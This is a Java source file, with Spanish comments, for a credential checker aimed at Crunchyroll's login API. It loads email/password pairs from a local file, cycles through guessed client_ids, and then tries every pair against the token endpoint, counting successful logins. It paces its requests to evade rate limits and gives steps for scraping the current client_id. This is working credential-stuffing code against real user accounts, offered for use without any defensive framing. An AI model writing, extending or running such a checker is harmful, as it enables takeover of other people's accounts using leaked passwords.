package es.srshiroh;

import java.io.*;
import java.net.http.*;
import java.net.URI;
import java.util.*;
import java.time.Duration;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.JsonNode;

public class CrunchyrollApiLoginTester {

    private static final String FILE_PATH = "C:\\Users\\Shiroh\\Documents\\try.txt";
    private static final String CRUNCHYROLL_API_BASE = "https://www.crunchyroll.com";
    private static final String LOGIN_API_ENDPOINT = "/auth/v1/token";
    private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

    // Lista de client_ids conocidos para probar (basado en investigación de comunidad)
    // Se añade el client_id más reciente obtenido manualmente al principio de la lista.
    private static final String[] KNOWN_CLIENT_IDS = {
            "Y2V1b2l0Z2t2ZnZ0Z2RpcGtvd2VqZm9rcA==", // Client ID más reciente (ejemplo)
            "cr_web",                    // Web client clásico
            "noaihdevm_6iyg0a8l0q",    // Posible mobile client
            "crunchyroll_web",          // Variante web
            "cr_mobile",                // Mobile client
            "crunchyroll_android",      // Android app
            "crunchyroll_ios",          // iOS app
            "web_client",               // Generic web
            "cr_beta_web"               // Beta web client
    };

    private static final String GRANT_TYPE = "password";
    private static final String SCOPE = "offline_access";

    private final HttpClient httpClient;
    private final ObjectMapper objectMapper;

    public CrunchyrollApiLoginTester() {
        this.httpClient = HttpClient.newBuilder()
                .connectTimeout(Duration.ofSeconds(15))
                .followRedirects(HttpClient.Redirect.NORMAL)
                .build();
        this.objectMapper = new ObjectMapper();
    }

    public static void main(String[] args) {
        System.out.println("=== PROBADOR CRUNCHYROLL CON MÚLTIPLES CLIENT_IDS ===\n");

        CrunchyrollApiLoginTester tester = new CrunchyrollApiLoginTester();

        List<CrunchyrollCredentialExtractor.UserCredential> credentials =
                CrunchyrollCredentialExtractor.extractCredentials(FILE_PATH);

        if (credentials.isEmpty()) {
            System.out.println("❌ No se encontraron credenciales válidas en el archivo.");
            return;
        }

        System.out.println("🎯 Probando con " + KNOWN_CLIENT_IDS.length + " client_ids diferentes");
        System.out.println("📧 Usando primera credencial como prueba: " + credentials.get(0).getEmail());
        System.out.println("🌐 Endpoint: " + CRUNCHYROLL_API_BASE + LOGIN_API_ENDPOINT + "\n");

        // Probar cada client_id con la primera credencial
        String validClientId = tester.findValidClientId(credentials.get(0));

        if (validClientId != null) {
            System.out.println("✅ CLIENT_ID VÁLIDO ENCONTRADO: " + validClientId);
            System.out.println("\n🚀 Procediendo a probar todas las credenciales...\n");

            // Ahora probar todas las credenciales con el client_id válido
            tester.testAllCredentials(credentials, validClientId);
        } else {
            System.out.println("❌ No se encontró ningún client_id válido");
            System.out.println("💡 Necesitas obtener el client_id actual manualmente");
            printManualInstructions();
        }
    }

    public String findValidClientId(CrunchyrollCredentialExtractor.UserCredential testCredential) {
        System.out.println("🔍 BUSCANDO CLIENT_ID VÁLIDO...");
        System.out.println("📧 Credencial de prueba: " + testCredential.getEmail());
        System.out.println("-".repeat(60));

        for (int i = 0; i < KNOWN_CLIENT_IDS.length; i++) {
            String clientId = KNOWN_CLIENT_IDS[i];

            System.out.println("🧪 Probando " + (i+1) + "/" + KNOWN_CLIENT_IDS.length +
                    ": " + clientId);

            AuthenticationResult result = testLoginWithClientId(testCredential, clientId);

            if (result != null) {
                if (result.isSuccess()) {
                    System.out.println("✅ ¡ÉXITO! Client ID válido: " + clientId);
                    return clientId;
                } else {
                    System.out.println("❌ " + result.getErrorMessage());

                    // Si el error no es invalid_client, el client_id podría ser válido
                    // pero las credenciales incorrectas
                    if (!result.getErrorMessage().contains("invalid_client")) {
                        System.out.println("💡 Client ID podría ser válido (error diferente a invalid_client)");
                        System.out.println("🤔 ¿Quieres usar este client_id? Podría funcionar con credenciales correctas");

                        // En un escenario real, podrías preguntar al usuario o hacer más pruebas
                        return clientId;
                    }
                }
            }

            System.out.println();

            // Pausa para evitar rate limiting
            if (i < KNOWN_CLIENT_IDS.length - 1) {
                safeSleep(2000);
            }
        }

        return null;
    }

    public AuthenticationResult testLoginWithClientId(CrunchyrollCredentialExtractor.UserCredential credential,
                                                      String clientId) {
        try {
            Map<String, String> formData = new HashMap<>();
            formData.put("grant_type", GRANT_TYPE);
            formData.put("client_id", clientId);
            formData.put("username", credential.getEmail());
            formData.put("password", credential.getPassword());
            formData.put("scope", SCOPE);

            String formBody = buildFormData(formData);

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(CRUNCHYROLL_API_BASE + LOGIN_API_ENDPOINT))
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .header("User-Agent", USER_AGENT)
                    .header("Accept", "application/json")
                    .header("Accept-Language", "es-ES,es;q=0.9,en;q=0.8")
                    .header("Origin", "https://www.crunchyroll.com")
                    .header("Referer", "https://www.crunchyroll.com/login")
                    .timeout(Duration.ofSeconds(20))
                    .POST(HttpRequest.BodyPublishers.ofString(formBody))
                    .build();

            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());

            return processApiResponse(credential.getEmail(), response.statusCode(), response.body());

        } catch (Exception e) {
            return new AuthenticationResult(credential.getEmail(), false,
                    "Error de conexión: " + e.getMessage());
        }
    }

    public void testAllCredentials(List<CrunchyrollCredentialExtractor.UserCredential> credentials,
                                   String validClientId) {
        System.out.println("=".repeat(60));
        System.out.println("🎯 PROBANDO TODAS LAS CREDENCIALES");
        System.out.println("🔑 Client ID: " + validClientId);
        System.out.println("📊 Total credenciales: " + credentials.size());
        System.out.println("=".repeat(60));

        List<AuthenticationResult> results = new ArrayList<>();
        int successCount = 0;
        int failCount = 0;

        for (int i = 0; i < credentials.size(); i++) {
            CrunchyrollCredentialExtractor.UserCredential credential = credentials.get(i);

            System.out.println("\n🔍 Probando credencial " + (i + 1) + "/" + credentials.size());
            System.out.println("📧 Email: " + credential.getEmail());

            AuthenticationResult result = testLoginWithClientId(credential, validClientId);

            if (result != null) {
                results.add(result);

                if (result.isSuccess()) {
                    successCount++;
                    System.out.println("✅ ÉXITO - Credencial válida!");
                    System.out.println("🎉 Access Token: " + maskToken(result.getAccessToken()));
                } else {
                    failCount++;
                    System.out.println("❌ FALLÓ: " + result.getErrorMessage());
                }
            } else {
                failCount++;
                System.out.println("❌ FALLÓ: Error crítico");
            }

            System.out.println("-".repeat(40));

            if (i < credentials.size() - 1) {
                safeSleep(3000);
            }
        }

        printSummary(results, successCount, failCount, validClientId);
    }

    // ... [resto de métodos auxiliares igual que antes] ...

    private String buildFormData(Map<String, String> data) {
        StringBuilder formData = new StringBuilder();
        boolean first = true;

        for (Map.Entry<String, String> entry : data.entrySet()) {
            if (!first) {
                formData.append("&");
            }

            try {
                String key = java.net.URLEncoder.encode(entry.getKey(),
                        java.nio.charset.StandardCharsets.UTF_8);
                String value = java.net.URLEncoder.encode(entry.getValue(),
                        java.nio.charset.StandardCharsets.UTF_8);
                formData.append(key).append("=").append(value);
            } catch (Exception e) {
                formData.append(entry.getKey()).append("=").append(entry.getValue());
            }

            first = false;
        }

        return formData.toString();
    }

    private AuthenticationResult processApiResponse(String email, int statusCode, String responseBody) {
        try {
            if (responseBody == null || responseBody.trim().isEmpty()) {
                return new AuthenticationResult(email, false,
                        "Respuesta vacía (Status: " + statusCode + ")");
            }

            JsonNode jsonResponse = objectMapper.readTree(responseBody);

            if (statusCode == 200) {
                String accessToken = getJsonString(jsonResponse, "access_token");
                String refreshToken = getJsonString(jsonResponse, "refresh_token");

                if (accessToken != null && !accessToken.isEmpty()) {
                    return new AuthenticationResult(email, true, accessToken, refreshToken, null, responseBody);
                }
            }

            String errorCode = getJsonString(jsonResponse, "error");
            String errorDescription = getJsonString(jsonResponse, "error_description");
            String message = getJsonString(jsonResponse, "message");

            String errorMessage = buildErrorMessage(statusCode, errorCode, errorDescription, message);
            return new AuthenticationResult(email, false, errorMessage);

        } catch (Exception e) {
            return new AuthenticationResult(email, false,
                    "Error procesando respuesta: " + e.getMessage());
        }
    }

    private String getJsonString(JsonNode node, String fieldName) {
        JsonNode field = node.get(fieldName);
        return (field != null && !field.isNull()) ? field.asText() : null;
    }

    private String buildErrorMessage(int statusCode, String errorCode, String errorDescription, String message) {
        StringBuilder msg = new StringBuilder();

        switch (statusCode) {
            case 400:
                msg.append("Petición inválida");
                break;
            case 401:
                msg.append("Credenciales inválidas");
                break;
            case 403:
                msg.append("Acceso prohibido");
                break;
            case 429:
                msg.append("Rate limit excedido");
                break;
            default:
                msg.append("Error HTTP ").append(statusCode);
        }

        if (errorCode != null) {
            msg.append(" [").append(errorCode).append("]");
        }

        String description = errorDescription != null ? errorDescription : message;
        if (description != null) {
            msg.append(": ").append(description);
        }

        return msg.toString();
    }

    private static String maskToken(String token) {
        if (token == null || token.length() < 16) {
            return "***";
        }
        return token.substring(0, 8) + "..." + token.substring(token.length() - 8);
    }

    private static void safeSleep(long milliseconds) {
        try {
            Thread.sleep(milliseconds);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static void printSummary(List<AuthenticationResult> results, int successCount,
                                     int failCount, String clientId) {
        System.out.println("\n" + "=".repeat(60));
        System.out.println("🎯 RESUMEN FINAL");
        System.out.println("=".repeat(60));
        System.out.println("🔑 Client ID usado: " + clientId);
        System.out.println("📊 Total probadas: " + results.size());
        System.out.println("✅ Exitosas: " + successCount);
        System.out.println("❌ Fallidas: " + failCount);

        if (results.size() > 0) {
            System.out.println("📈 Tasa de éxito: " +
                    String.format("%.2f%%", (successCount * 100.0 / results.size())));
        }

        System.out.println("=".repeat(60));
    }

    private static void printManualInstructions() {
        System.out.println("\n💡 OBTENER CLIENT_ID MANUALMENTE:");
        System.out.println("1. Ve a https://www.crunchyroll.com/login");
        System.out.println("2. Abre DevTools (F12) → Network");
        System.out.println("3. Intenta hacer login");
        System.out.println("4. Busca petición POST a '/auth/v1/token'");
        System.out.println("5. Copia el valor de 'client_id' del formulario");
    }
}
